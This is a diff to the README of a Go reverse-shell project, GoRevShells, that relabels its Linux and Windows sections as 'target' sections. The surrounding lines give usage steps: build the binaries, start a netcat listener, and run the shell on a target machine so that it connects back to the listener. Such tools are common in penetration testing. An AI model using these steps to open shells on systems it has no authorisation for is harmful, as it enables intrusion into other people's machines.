@@ -6,7 +6,7 @@ Basic reverse shell for linux and windows written in Go. Based off of @yougg's h
 $ git clone https://github.com/NihilistPenguin/GoRevShells.git
 $ cd GoRevshells
 ```
-#### For linux:
+#### For linux target:
 ```
 $ cd linux
 $ GOOS=linux go build linrev.go
@@ -14,7 +14,7 @@ $ GOOS=linux go build linrev.go
 Start netcat listener on host: `$ nc -nvlp PORT`<br>
 On target machine: `$ ./linrev IP:PORT` or `$ ./linrev` (uses value set in *const default_host* of linrev.go file)
 
-#### For windows:
+#### For windows target:
 ```
 $ cd windows
 $ GOOS=windows go build winrev.go
